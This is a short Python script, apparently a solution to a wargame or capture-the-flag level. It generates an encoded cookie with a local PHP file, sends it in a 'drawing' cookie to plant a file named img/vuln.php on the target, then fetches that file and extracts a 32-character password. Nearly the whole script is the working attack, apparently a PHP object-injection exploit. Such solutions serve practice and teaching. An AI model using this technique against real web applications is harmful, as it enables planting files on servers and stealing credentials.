import config
import os, re, base64
from subprocess import check_output
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

file = "img/vuln.php"

encoded_cookie = check_output(["php", "{}.php".format(user)])

response = get(url, auth=(user, password), cookies={"drawing" : encoded_cookie })
response = get(url + "/" + file, auth=(user, password))

password = re.findall(r"\w{32}", response.content)[-1]

print(password)